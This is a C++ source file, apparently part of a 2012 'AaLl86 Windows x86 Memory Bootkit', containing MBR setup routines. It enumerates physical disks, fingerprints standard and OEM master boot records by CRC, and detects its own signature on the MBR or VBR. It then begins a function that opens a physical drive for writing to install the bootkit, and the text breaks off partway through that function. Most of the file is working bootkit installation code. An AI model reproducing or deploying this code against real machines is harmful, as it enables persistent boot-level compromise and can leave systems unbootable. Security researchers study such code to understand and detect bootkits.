/**********************************************************************
 * 
 *  AaLl86 Windows x86 Memory Bootkit
 *  Bootkit MBR setup routines module
 *	Last revision: 
 *
 *  Copyright© 2012 by AaLl86
 *	All right reserved
 * 
 **********************************************************************/

#include "stdafx.h"
#include "BootkitMbrSetup.h"
#include "PeResource.h"
#include "VariousStuff.h"
#include <WinIoCtl.h>

// Number of sector to analyze in searching standard Mbr
#define STDMBR_NUMSECT_TO_ANALYZE 0x10

// Default constructor
CBootkitMbrSetup::CBootkitMbrSetup(void):
	g_pLog(new CLog()),
	g_bIsMyOwnLog(true)
{
	g_btkType = BOOTKIT_TYPE_UNKNOWN_OR_AUTO;
	g_bDontAnalyzeMbr = FALSE;
	// Set default boot system disk index as 0
	g_dwSysBootDskIdx = 0;
}

// Log constructor
CBootkitMbrSetup::CBootkitMbrSetup(CLog & log) :
	g_pLog(&log),
	g_bIsMyOwnLog(false)
{
	g_btkType = BOOTKIT_TYPE_UNKNOWN_OR_AUTO;
	g_bDontAnalyzeMbr = FALSE;
	// Set default boot system disk index as 0
	g_dwSysBootDskIdx = 0;
}

CBootkitMbrSetup::~CBootkitMbrSetup(void)
{
	if (g_pLog && g_bIsMyOwnLog) delete g_pLog;
}

#pragma region Device Objects Utility Functions
// Get physical disk number of a volume
DWORD CBootkitMbrSetup::GetPhysDiskOfVolume(LPTSTR volName, bool bErrIfMultipleDisks) {
	VOLUME_DISK_EXTENTS vde = {0};					// Structure for volume/physical disk conversion
	HANDLE hVol = NULL;								// Handle to opened volume
	DWORD dwBytesRet = 0;							// Number of bytes returned
	BOOL retVal = FALSE;
	DWORD lastErr = 0;
	TCHAR realDosVolName[10] = {0};
	if (!volName) return (DWORD)-1;

	wcscpy_s(realDosVolName, COUNTOF(realDosVolName), L"\\\\.\\A:");
	if (volName[0] == L'\\') wcsncpy(realDosVolName, volName, COUNTOF(realDosVolName) -1);
	else realDosVolName[4] = volName[0];

	hVol = CreateFile(realDosVolName, GENERIC_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	lastErr = GetLastError();
	if (hVol == INVALID_HANDLE_VALUE) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::GetPhysDiskOfVolume - Unable to open Volume \"%s\" for executing Disk Extents IOCTL...", (LPVOID)volName);
		return (DWORD)-1;
	}

	// Get physical disk number
	retVal = DeviceIoControl(hVol, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, NULL, 0, (LPVOID)&vde, sizeof(vde), &dwBytesRet, NULL);
	lastErr = GetLastError();
	CloseHandle(hVol);
	if (!retVal) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::GetPhysDiskOfVolume - Unable to obtain Disk Extents for volume \"%s\". DeviceIoControl last error: %i", 
			(LPVOID)volName, (LPVOID)lastErr);
		return (DWORD)-1;
	}
	if ((vde.NumberOfDiskExtents > 1) && bErrIfMultipleDisks) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::GetPhysDiskOfVolume - Error, volume \"%s\" belongs to more then one Physical disk!", (LPVOID)volName);
		return (DWORD)-1;
	}

	return (vde.Extents[0].DiskNumber);
}

// Get if a particular device is accessible from user-mode
bool CBootkitMbrSetup::DeviceExists(LPTSTR devName) {
	HANDLE hDrv = NULL;
	hDrv = CreateFile(devName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDrv == INVALID_HANDLE_VALUE) return false;
	CloseHandle(hDrv);
	return true;
}

// Get if a particular drive is readable
bool CBootkitMbrSetup::IsDeviceReadable(LPTSTR devName) {
	HANDLE hDrv = NULL;
	BOOL retVal = FALSE;
	DWORD dwBytesRead = 0;
	BYTE buff[0x200] = {0};

	hDrv = CreateFile(devName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDrv == INVALID_HANDLE_VALUE) return false;

	retVal = ReadFile(hDrv, buff, COUNTOF(buff), &dwBytesRead, NULL);
	CloseHandle(hDrv);
	return (retVal != FALSE);
}

// Get if a Volume is a Mbr based or a FS Based (like floppy disks)
CBootkitMbrSetup::DISK_TYPE CBootkitMbrSetup::GetVolumeDiskType(LPTSTR volName) {
	DWORD diskNum = 0;
	DISK_TYPE dskType = DISK_TYPE_UNKNOWN;

	diskNum = GetPhysDiskOfVolume(volName, false);
	if (diskNum == (DWORD)-1) {
		// Use volume name to analysis
		dskType = GetDiskDevType(volName);
	} else
		dskType = GetDiskDrvType(diskNum);
	return dskType;
}

// Get disk drive partitioning type 
CBootkitMbrSetup::DISK_TYPE CBootkitMbrSetup::GetDiskDrvType(DWORD drvNum) {
	TCHAR hdName[0x20] = {0};						// Setup Physical disk device DOS Name
	TCHAR drvNumStr[0x4] = {0};						// Drive number string
	// Initialize this function Base data
	wcscpy_s(hdName, COUNTOF(hdName), L"\\\\.\\PhysicalDrive\0\0");
	_itow(drvNum, drvNumStr, 10);
	wcscat_s(hdName, COUNTOF(hdName), drvNumStr);
	return GetDiskDevType(hdName);
}

// Get disk drive partitioning type 
CBootkitMbrSetup::DISK_TYPE CBootkitMbrSetup::GetDiskDevType(LPTSTR devName) {
	HANDLE hDrive = NULL;							// Current hard disk handle
	BOOL retVal = 0;								// Win32 API returned value
	DWORD lastErr = 0;								// Last win32 Error
	PMASTER_BOOT_RECORD pMbr = NULL;				// Read Master Boot Sector
	BYTE buff[0x400] = {0};							// Generic Stack Buffer
	DISK_GEOMETRY_EX diskGeom = {0};				// Disk geometry structure 
	DWORD dwTotalDiskSect = 0;						// Total disk sectors
	DWORD dwBytesRead = 0;							// Total number of bytes read
	DISK_TYPE dskType = DISK_TYPE_UNKNOWN;

	hDrive = CreateFile(devName, GENERIC_READ | GENERIC_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	lastErr = GetLastError();
	if (hDrive == INVALID_HANDLE_VALUE) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::GetDiskDrvType - Unable to open \"%s\" for reading...", (LPVOID)devName);
		return DISK_TYPE_UNKNOWN;
	}

	// 0. Read first sector and analyze it
	retVal = ReadFile(hDrive, (LPVOID)buff, 0x200, &dwBytesRead, NULL);
	lastErr = GetLastError();
	if (!retVal) {
		// Error while reading Disk
		g_pLog->WriteLine(L"CBootkitMbrSetup::GetDiskDrvType - Unable to read sector 1 from \"%s\". Last Error: %i",
			(LPVOID)devName, (LPVOID)lastErr);
		CloseHandle(hDrive);
		return DISK_TYPE_UNKNOWN;
	}

	// Get disk Geometry to obtain Total Disk Sector
	retVal = DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, (LPVOID)&diskGeom, sizeof( DISK_GEOMETRY_EX), &dwBytesRead, NULL);
	if (!retVal) 
		// No disk geometry
		dwTotalDiskSect = 0;		// Floppy total sector
	else
		dwTotalDiskSect = (DWORD)(diskGeom.DiskSize.QuadPart / diskGeom.Geometry.BytesPerSector);

	CloseHandle(hDrive);			// We no longer need it

	// Analyze first sector and try to find what kind Partition type
	pMbr = (PMASTER_BOOT_RECORD)buff;
	if (pMbr->signature != MBR_SIGNATURE) {
		// Unknown sector type
		RtlZeroMemory(&buff[200], 0x200);
		if (memcmp(buff, &buff[200], 0x200) == 0)
			dskType = DISK_TYPE_CLEAN;
		else
			dskType = DISK_TYPE_UNKNOWN;
		return dskType;
	}
	for (int i = 0; i < 4; i++) {
		PARTITION_ELEMENT pElem = pMbr->PTable.Partition[i];
		if (pElem.FileSystemType && 
			pElem.FreeSectorsBefore && pElem.TotalSectors && (!dwTotalDiskSect ||
			(pElem.FreeSectorsBefore + pElem.TotalSectors) <= dwTotalDiskSect) &&
			(pElem.Bootable == 0 || pElem.Bootable == 0x80)) {
			dskType = DISK_TYPE_MBR;
			break;
		}
	}

	// No Valid MBR, go ahead and search for know FS
	if (strncmp((LPSTR)&buff[4], "NTFS", 4) == 0)
		// Case 0. NTFS Boot sector found
		dskType = DISK_TYPE_NTFS_FS;
	else if (strncmp((LPSTR)&buff[54], "FAT12", 5) == 0 ||
		strncmp((LPSTR)&buff[54], "FAT  ", 5) == 0 ||
		strncmp((LPSTR)&buff[54], "FAT16", 5) == 0) 
		// Case 1. FAT Boot sector found
		dskType = DISK_TYPE_FAT_FS;
	else if (strncmp((LPSTR)&buff[82], "FAT32", 5) == 0)
		// Case 2. FAT32 Boot Sector found
		dskType = DISK_TYPE_FAT32_FS;
	return dskType;
}
#pragma endregion

#pragma region Get Bootkit State
// Get if bootkit is currently installed in a particular volume
BOOTKIT_STATE CBootkitMbrSetup::GetVolBootkitState(LPTSTR volName) {
	BOOTKIT_STATE curState = BOOTKIT_STATE_UNKNOWN;			// Current drive bootkit state
	DWORD diskNum = 0;

	diskNum = GetPhysDiskOfVolume(volName);
	if (diskNum == (DWORD)-1) 
		// Use this volume name as Device
		curState = GetDevBootkitState(volName);
	else
		curState = GetBootkitState(diskNum);
	return curState;
}

// Get if bootkit is currently installed in this System
BOOTKIT_STATE CBootkitMbrSetup::GetBootkitState(DWORD drvNum, BOOTKIT_SETUP_TYPE * pSetupType) {
	TCHAR hdName[0x20] = {0};						// Setup Physical disk device DOS Name
	TCHAR drvNumStr[0x4] = {0}; 
	// Initialize this function Base data
	wcscpy_s(hdName, COUNTOF(hdName), L"\\\\.\\PhysicalDrive\0\0");
	_itow(drvNum, drvNumStr, 10);
	wcscat_s(hdName, COUNTOF(hdName), drvNumStr);
	
	return GetDevBootkitState(hdName, pSetupType);
}

// Analyze current system and suggest Target Bootkit type
CBootkitMbrSetup::BOOTKIT_TYPE CBootkitMbrSetup::GetBootkitTypeForSystem() {
	HANDLE hVol = NULL;
	TCHAR bootVolName[0x100] = {0};					// Bootmgr volume name ...
	DWORD bootVolNum = 0;							// and number (\\??\HardDiskVolumeX)
	BYTE buff[0x600] = {0};							// 3 Sectors buffer
	DWORD bytesRead = 0;							// Total number of bytes read
	DWORD lastErr = 0;								// Last Win32 Error
	BOOL retVal = FALSE;							// Win32 APIs Returned value
//	BOOTKIT_TYPE retType;							// Returned Bootkit Type

	// Get System Boot volume name
	bootVolNum = GetBootmgrVolume(bootVolName, COUNTOF(bootVolName));
	if (bootVolNum == (DWORD)-1) {
		g_pLog->WriteLine(L"GetBootkitTypeForSystem - Unable to get Boot Volume name and Number. GetBootmgrVolume has failed!");
		return BOOTKIT_TYPE_UNKNOWN_OR_AUTO;
	}

	// Analyze Boot Sector and get if it is standard
	hVol = CreateFile(bootVolName, FILE_GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	lastErr = GetLastError();
	if (!hVol) {
		g_pLog->WriteLine(L"GetBootkitTypeForSystem - Unable to obtain access to system boot Volume. Last error: %i", (LPVOID)lastErr);
		return BOOTKIT_TYPE_UNKNOWN_OR_AUTO;
	}
	retVal = ReadFile(hVol, buff, COUNTOF(buff), &bytesRead, NULL);
	CloseHandle(hVol);			// We no longer need it

	NTFS_BOOT_SECTOR * pNtfs = (NTFS_BOOT_SECTOR*)buff;
	if (pNtfs->wSecMark == 0xAA55 && strncmp(pNtfs->chOemID, "NTFS  ", 6) == 0) {
		// NTFS Boot Sector, analyze sector Boot Program 
		PNTFS_BOOT_PROGRAM ntfsApp = (PNTFS_BOOT_PROGRAM)&buff[pNtfs->BPB.wBytesPerSec];
		BOOLEAN bNameOk = FALSE;			// TRUE if Boot application name is ok
		PWORD pNtfsAttrLen = 0; LPTSTR ntfsAttr = NULL;			// Boot application filename attribute
		LPWSTR strLoader = NULL;			// Compatible boot loader name

		if (ntfsApp->wBtmgrNameLen > 5) 
			bNameOk = (wcsncmp(ntfsApp->wsBootmgr, L"BOOTMGR", ntfsApp->wBtmgrNameLen) == 0);
		else
			bNameOk = (wcsncmp(ntfsApp->wsBootmgr, L"NTLDR", ntfsApp->wBtmgrNameLen) == 0);
		
		pNtfsAttrLen = (WORD*)((LPBYTE)ntfsApp + (sizeof(ntfsApp->wBtmgrNameLen) + (ntfsApp->wBtmgrNameLen * sizeof(TCHAR))));
		ntfsAttr = (LPTSTR)(pNtfsAttrLen + 1);

		if (!bNameOk)
			WriteToLog(L"GetBootkitTypeForSystem - Warning! NTFS Boot program \"%s\" name is not "
			L"valid for Volume %i!", (LPVOID)ntfsApp->wsBootmgr, (LPVOID)bootVolNum);
		
		if (wcsncmp(ntfsAttr, L"$I30", *pNtfsAttrLen) != 0)
			WriteToLog(L"GetBootkitTypeForSystem - Warning! NTFS Boot program \"$Filename\" attribute "
			L"name is not valid for Volume %i!", (LPVOID)bootVolNum);
		
		strLoader = (LPWSTR)((LPBYTE)ntfsApp + 0x5C);
		if (wcsncmp(strLoader, L"NTLDR", 5) == 0 ||
			strLoader[0] == 0)
			return BOOTKIT_TYPE_STANDARD;
		else
			return BOOTKIT_TYPE_COMPATIBLE;
		
	} else {
		g_pLog->WriteLine(L"GetBootkitTypeForSystem - Warning: Boot sector for volume %i is not NTFS!", (LPVOID)bootVolNum);
		// NO NTFS File system, return Standard Type
		return BOOTKIT_TYPE_STANDARD;
	}
}

// Get if bootkit is currently installed in this System
BOOTKIT_STATE CBootkitMbrSetup::GetDevBootkitState(LPTSTR devName, BOOTKIT_SETUP_TYPE * pSetupType) {
	HANDLE hDrive = NULL;							// Current hard disk handle
	BOOL retVal = 0;								// Win32 API returned value
	DWORD lastErr = 0;								// Last win32 Error
	MASTER_BOOT_RECORD mbr = {0};					// Read Master Boot Sector
	PBOOTKIT_STARTER pStarter = NULL;				// Bootkit starter program header
	PBOOTKIT_PROGRAM pBootkit = NULL;				// Bootkit program header
	DWORD dwBytesRead = 0;							// Total number of bytes read
	BOOTKIT_STATE curState = BOOTKIT_STATE_UNKNOWN;	// Current drive bootkit state
	LPBYTE buff = NULL;								// Generic buffer
	DWORD buffSize = 0;								// Buffer Size
	DISK_GEOMETRY_EX diskGeom = {0};				// Disk geometry structure 
	DWORD dwTotalDiskSect = 0;						// Total disk sectors

	hDrive = CreateFile(devName, GENERIC_READ | GENERIC_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	lastErr = GetLastError();
	if (hDrive == INVALID_HANDLE_VALUE) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::GetBootkitState - Unable to open \"%s\" for reading...", (LPVOID)devName);
		return BOOTKIT_STATE_UNKNOWN;
	}

	// 0. Read System Mbr and analyze it
	retVal = ReadFile(hDrive, (LPVOID)&mbr, sizeof(mbr), &dwBytesRead, NULL);
	lastErr = GetLastError();
	if (!retVal) {
		// Error while reading Disk
		g_pLog->WriteLine(L"CBootkitMbrSetup::GetBootkitState - Unable to read original Mbr from \"%s\". Last Error: %i",
			(LPVOID)devName, (LPVOID)lastErr);
		CloseHandle(hDrive);
		return BOOTKIT_STATE_UNKNOWN;
	}

	pStarter = (PBOOTKIT_STARTER)mbr.MBP;
	if (strncmp(pStarter->signature, "AaLl86", 6) == 0) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::GetBootkitState - Found x86 Memory bootkit signature on MBR of  \"%s\".", (LPVOID)devName);
		curState = BOOTKIT_INSTALLED;
		if (pSetupType) *pSetupType = BOOTKIT_SETUP_MBR;
	} else {
		g_pLog->WriteLine(L"CBootkitMbrSetup::GetBootkitState - x86 Memory bootkit not found on MBR of  \"%s\".", (LPVOID)devName);
		curState = IsBootkitInstalledInVbr(hDrive, devName);
		CloseHandle(hDrive);
		if (curState == BOOTKIT_INSTALLED) {
			if (pSetupType) *pSetupType = BOOTKIT_SETUP_VBR;
		}	
		return curState;
	}
	_ASSERT(pStarter->uchStarterType == 1);			// Assure that this is a MBR Starter

	// Get disk Geometry to obtain Total Disk Sector
	retVal = DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, (LPVOID)&diskGeom, sizeof( DISK_GEOMETRY_EX), &dwBytesRead, NULL);
	if (!retVal) {
		// No disk geometry
		dwTotalDiskSect = (DWORD)-1;
		diskGeom.Geometry.BytesPerSector = 0x200;
	} else
		dwTotalDiskSect = (DWORD)(diskGeom.DiskSize.QuadPart / diskGeom.Geometry.BytesPerSector);

	// Now analyze bootkit sectors
	buffSize = 2048;
	buff = new BYTE[buffSize];
	
	LARGE_INTEGER newOffset = { 0 };
	newOffset.QuadPart = pStarter->dwBtkStartSector * diskGeom.Geometry.BytesPerSector;
	retVal = SetFilePointerEx(hDrive, newOffset, NULL, FILE_BEGIN);
	if (retVal)
		retVal = ReadFile(hDrive, buff, buffSize, &dwBytesRead, NULL);
	lastErr = GetLastError();
	if (!retVal) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::GetBootkitState - Unable to read bootkit sector 0x%08X. Last error: %i.",
			(LPVOID)pStarter->dwBtkStartSector, (LPVOID)lastErr);
		CloseHandle(hDrive);
		delete[] buff;
		return BOOTKIT_DAMAGED;
	} 

	pBootkit = (PBOOTKIT_PROGRAM)buff;
	if (strncmp(pBootkit->signature, "AaLl86", 6) != 0) {
		// No good bootkit code found
		g_pLog->WriteLine(L"CBootkitMbrSetup::GetBootkitState - x86 Memory bootkit main bootkit code not found on sector 0x%08x of \"%s\".", 
			(LPVOID)pStarter->dwBtkStartSector, (LPVOID)devName);
		curState = BOOTKIT_DAMAGED; 
	} else {
		curState = BOOTKIT_INSTALLED;
		g_pLog->WriteLine(L"CBootkitMbrSetup::GetBootkitState - AaLl86 bootkit found installed and active on \"%s\".", (LPVOID)devName);
	}

	CloseHandle(hDrive);
	delete[] buff;

	return curState;
}
#pragma endregion

#pragma region MBR Install & Remove functions
 /* Peek into MBR and assess if it's a Windows standard MBR
  * Possible values: 0x0 - MBR is NOT standard
  *					 0x01 - MBR is certainly standard
  *					 0x02 - MBR is in a suspected state
  *					 0x03 - Non Standard MBR - HP MBR
  *					 0x04 - Non Standard MBR - HP MBR Version 2
  *					 0xFF - Request has found an error		*/
BYTE CBootkitMbrSetup::IsStandardMbr(MASTER_BOOT_RECORD & mbr) {
	// CRC32 Offset 0 - 0x153
	ULONG crcStartOffset = 0x0;
	ULONG crcEndOffset = 0x148;
	BYTE res = 0;

	ULONG mbpCrc = CCrc32::GetCrc(mbr.MBP, crcStartOffset, crcEndOffset - crcStartOffset);
	if (mbpCrc == 0xCECABA9D)
		// Vista Master Boot Record
		res = 1;
	else if (mbpCrc == 0x562AC8E8)
		// Seven/Eight Master Boot Record
		res = 1;

	// NON standard MBR - Search for OEM manufacturer Mbrs
	// HP Mbr
	if (!res) {
		crcStartOffset = 0x2B;
		crcEndOffset = 0x14B;
		mbpCrc = CCrc32::GetCrc(mbr.MBP, crcStartOffset, crcEndOffset - crcStartOffset);
		if (mbpCrc == 0x46365C6D) res = 0x03;		// HP MBR
		if (mbpCrc == 0x2324E741) res = 0x04;		// HP MBR Ver.2
	}

	if (!res) {
		BYTE signature[] = {
			0x66, 0x81, 0xFB, 0x54, 0x43, 0x50,		// mov ebx, 'TCPA'
			0x75};									// jnz +0xZZ (0x11)
		// Search a signature in MBR and obtain an heuristic value
		for (USHORT i = 0; i < sizeof(mbr.MBP); i++)  {
			for (USHORT j = 0; j < sizeof(signature); j++) {
				if (mbr.MBP[i+j] != signature[j])
					break;
				else {
					if (j >= sizeof(signature) - 1)  
						res = 2; 
				}
			}
			if (res) break;
		}
	}
	return res;
}

// Peek into MBR and assess if it's a Windows standard MBR
BYTE CBootkitMbrSetup::InternalSearchStandardMbr(HANDLE hDrive, LPDWORD pStdMbrSectNumber) {
	MASTER_BOOT_RECORD mbr = {0};					// Read Master Boot Sector
	BOOL retVal = 0;								// Win32 API returned value
	BYTE chRes = (BYTE)-1;							// Result value
	DWORD lastErr = 0;								// Last win32 Error
	DWORD dwBytesRead = 0;							// Total number of bytes read
	LPBYTE buff = NULL;								// Generic buffer
	DWORD buffSize = 0;								// Generic buffer size
	LARGE_INTEGER orgFilePointer = {0};				// Original file pointer
	LARGE_INTEGER distanceToMove = {0,0};			// Distance to move
	if (!hDrive || hDrive == INVALID_HANDLE_VALUE) return (BYTE)-1;

	// Get current file pointer
	retVal = SetFilePointerEx(hDrive, distanceToMove, &orgFilePointer, FILE_CURRENT);

	// Read System Mbr
	retVal = SetFilePointerEx(hDrive, distanceToMove, NULL, FILE_BEGIN);
	retVal = ReadFile(hDrive, (LPVOID)&mbr, sizeof(mbr), &dwBytesRead, NULL);
	lastErr = GetLastError();
	if (!retVal) {
		// Error while reading Disk
		g_pLog->WriteLine(L"CBootkitMbrSetup::InternalSearchStandardMbr - %i Read error occured on drive.", (LPVOID)lastErr);
		return chRes;
	}

	retVal = SetFilePointerEx(hDrive, orgFilePointer, NULL, FILE_BEGIN);

	// Get if sector 0 is standard Windows Mbr
	chRes = (BYTE)IsStandardMbr(mbr);

	if (chRes != 1 && pStdMbrSectNumber) {
		*pStdMbrSectNumber = (DWORD)-1;
		buffSize = SECTOR_SIZE * STDMBR_NUMSECT_TO_ANALYZE;
		buff = (LPBYTE)VirtualAlloc(NULL, buffSize, MEM_COMMIT, PAGE_READWRITE);
		if (!buff) {
			g_pLog->WriteLine(L"CBootkitMbrSetup::InternalSearchStandardMbr Error: Insufficient system resources.");
			*pStdMbrSectNumber = (BYTE)-1;
			return chRes;
		}
		// Search standard Mbr 
		retVal = SetFilePointer(hDrive, 0 , NULL, FILE_BEGIN);
		// Read all remaining sectors
		retVal = ReadFile(hDrive, buff, buffSize, &dwBytesRead, NULL);
		lastErr = GetLastError();
		if (!retVal) {
			g_pLog->WriteLine(L"CBootkitMbrSetup::InternalSearchStandardMbr - Read error %i while searching Windows MBR...", (LPVOID)lastErr);
			return chRes;
		}
		retVal = SetFilePointerEx(hDrive, orgFilePointer, NULL, FILE_BEGIN);

		// Now perform search
		for (unsigned int i = 0; i < buffSize / SECTOR_SIZE; i++) {
			PMASTER_BOOT_RECORD curItem = (PMASTER_BOOT_RECORD)&buff[i * SECTOR_SIZE];
			if (curItem->signature != MBR_SIGNATURE) continue;
			// Get if this sector is a standard MBR
			BYTE chRes2 = this->IsStandardMbr(*curItem);
			if (chRes2 == 1) {
				// Standard MBR found
				*pStdMbrSectNumber = i;
				break;
			}
		}
		// Free used resources
		VirtualFree(buff, 0, MEM_RELEASE);
	} else {
		if (*pStdMbrSectNumber) *pStdMbrSectNumber = 0;
	}

	return chRes;
}

// Peek into MBR and assess if it's a Windows standard MBR, otherwise, search standard MBR sector number	
// Possible values:  0x0  - MBR is NOT standard
//					 0x01 - MBR is certainly standard
//					 0x02 - MBR is in a suspected state
//					 0x03 - Non Standard MBR - HP MBR
//					 0x04 - Non Standard MBR - HP MBR Version 2
//					 0xFF - Request has found an error
BYTE CBootkitMbrSetup::IsStandardMbr(DWORD drvNum, LPDWORD pStdMbrSectNumber) {
	TCHAR hdName[0x20] = {0};						// Setup Physical disk device DOS Name
	TCHAR drvNumStr[0x4] = {0};						// Drive number string
	HANDLE hDrive = NULL;							// Current hard disk handle
	BYTE chRes = (BYTE)-1;							// Results value
	DWORD lastErr = 0;								// Last Win32 error

	// Initialize this function Base data
	wcscpy_s(hdName, COUNTOF(hdName), L"\\\\.\\PhysicalDrive\0\0");
	_itow(drvNum, drvNumStr, 10);
	wcscat_s(hdName, COUNTOF(hdName), drvNumStr);

	hDrive = CreateFile(hdName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	lastErr = GetLastError();
	if (hDrive == INVALID_HANDLE_VALUE) {
		// Error while reading Disk
		g_pLog->WriteLine(L"CBootkitMbrSetup::IsStandardMbr - Unable to open \"%s\" drive. Last error: %i",
			(LPVOID)hdName, (LPVOID)lastErr);
		if (pStdMbrSectNumber) *pStdMbrSectNumber = (DWORD)-1;
	} else {
		chRes = InternalSearchStandardMbr(hDrive, pStdMbrSectNumber);
		if (chRes == 1)
			g_pLog->WriteLine(L"CBootkitMbrSetup::IsStandardMbr - Found a standard Windows MBR Sector on drive %i.", (LPVOID)drvNum);
		else if (chRes == 2)
			g_pLog->WriteLine(L"CBootkitMbrSetup::IsStandardMbr - Warning!! MBR sector of disk drive %i is in a suspected state... "
			L"Maybe NON standard one??", (LPVOID)drvNum);
		else if (chRes == 3 || chRes == 4)
			g_pLog->WriteLine(L"CBootkitMbrSetup::IsStandardMbr - Found HP Mbr Sector on drive %i...", (LPVOID)drvNum); 
		else
			g_pLog->WriteLine(L"CBootkitMbrSetup::InternalSearchStandardMbr - Warning!! MBR sector of disk drive %i is NOT a "
			L"Standard Windows program. Some custom loader installed??", (LPVOID)drvNum);
	}

	return chRes;
}

// Install Bootkit on system MBR
bool CBootkitMbrSetup::MbrInstallBootkit(DWORD drvNum, BOOLEAN bRemovable, BYTE bootDiskIdx) {
	TCHAR hdName[0x20] = {0};						// Setup Physical disk device DOS Name
	TCHAR drvNumStr[0x4] = {0};						// Drive number string

	BOOTKIT_TYPE btkType;
	// Get suggested bootktit type for this system
	if (g_btkType == BOOTKIT_TYPE_UNKNOWN_OR_AUTO) {
		btkType = GetBootkitTypeForSystem();
		if (btkType != BOOTKIT_TYPE_STANDARD)
			g_pLog->WriteLine(L"MbrInstallBootkit - Detected non-standard Windows Loader on this System. I'll use Compatible Bootkit type (no Bootmgr signature needed).");
	} else
		btkType = g_btkType;

	// Initialize this function Base data
	wcscpy_s(hdName, COUNTOF(hdName), L"\\\\.\\PhysicalDrive\0\0");
	_itow(drvNum, drvNumStr, 10);
	wcscat_s(hdName, COUNTOF(hdName), drvNumStr);
	return DevMbrInstallBootkit(hdName, btkType, bRemovable, bootDiskIdx);
}

// Install Memory bootkit in a particular Device Mbr
bool CBootkitMbrSetup::DevMbrInstallBootkit(LPTSTR devName, BOOTKIT_TYPE btkType, BOOLEAN bRemovable, BYTE bootDiskIdx)
{
	HANDLE hDrive = NULL;							// Current hard disk handle
	BOOL retVal = 0;								// Win32 API returned value
	DWORD lastErr = 0;								// Last win32 Error
	MASTER_BOOT_RECORD mbr = {0};					// Read Master Boot Sector
	DWORD dwBytesRead = 0;							// Total number of bytes read
	DISK_GEOMETRY_EX diskGeom = {0};				// Disk geometry structure 
	DWORD dwNewOrgMbrSect = 0;						// New original MBR Sector number
	DWORD dwWinMbrSect = 0;							// Original Windows MBR sector number
	DWORD dwBootkitBodySect = 0;					// Bootkit program sector number
	DWORD dwBtkProgramSize = 0;						// Bootkit program code size
	MASTER_BOOT_RECORD bootkitMbr = {0};			// Bootkit new Master Boot Sector
	DWORD dwResSize = 0;							// Resource size
	OSVERSIONINFOEX verInfo =						// Current OS Version Info
		{sizeof(OSVERSIONINFOEX), 0};
	//LPBYTE buff = NULL;								// Generic buffer
	//DWORD buffSize = 0;								// Buffer Size
	DWORD dwBootmgrSign = 0;						// Bootmgr Signature
	BYTE bBootmgrStartByte = 0;						// Bootmgr Start byte
	LPBYTE lpCurRes = NULL;							// Current resource pointer
	GetVersionEx((LPOSVERSIONINFO)&verInfo);		

	_ASSERT(btkType != BOOTKIT_TYPE_UNKNOWN_OR_AUTO);
	if (btkType == BOOTKIT_TYPE_UNKNOWN_OR_AUTO) return false;
	if (btkType == BOOTKIT_TYPE_STANDARD) {
		// Get bootmgr Signautre
		retVal = GetBootmgrSignature(&bBootmgrStartByte, &dwBootmgrSign);
		if (!retVal) {
			g_pLog->WriteLine(L"CBootkitMbrSetup::MbrInstallBootkit - Unable to obtain Bootmgr signature!");
			return false;
		}
	}

	// Open Disk device object
	hDrive = CreateFile(devName, GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	lastErr = GetLastError();
	if (hDrive == INVALID_HANDLE_VALUE) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::MbrInstallBootkit - Unable to open \"%s\" for reading...", (LPVOID)devName);
		return false;
	}

	// |---------------------------------------------------------------------------------------------------------------------------------------|
	// |  0. Read System Mbr and analyze it
	retVal = ReadFile(hDrive, (LPVOID)&mbr, sizeof(mbr), &dwBytesRead, NULL);
	lastErr = GetLastError();
	if (!retVal) {
		// Error while reading Disk
		g_pLog->WriteLine(L"CBootkitMbrSetup::MbrInstallBootkit - Unable to read original Mbr from \"%s\". Last Error: %i",
			(LPVOID)devName, (LPVOID)lastErr);
		CloseHandle(hDrive);
		return false;
	}

	// And analyze it
	DWORD dwFirstPartSect = 0;			// First Partition Sector
	DWORD dwLastPartSect = 0;			// Last partition Sector
	DWORD dwTotalDiskSect = 0;			// Total disk sector

	for (int i = 0; i < 4; i++) {
		PARTITION_ELEMENT & curElem = mbr.PTable.Partition[i];
		if (!curElem.FileSystemType) continue;

		// Get first partition sector
		if (curElem.FreeSectorsBefore) {
			if ((curElem.FreeSectorsBefore < dwFirstPartSect) || !dwFirstPartSect) 
				dwFirstPartSect = curElem.FreeSectorsBefore;
		}
		// Get last partition sector
		if (dwLastPartSect <= (curElem.FreeSectorsBefore + curElem.TotalSectors)) 
			dwLastPartSect = curElem.FreeSectorsBefore + curElem.TotalSectors;
	}

	// Get disk Geometry to obtain Total Disk Sector
	retVal = DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, (LPVOID)&diskGeom, sizeof( DISK_GEOMETRY_EX), &dwBytesRead, NULL);
	if (!retVal) {
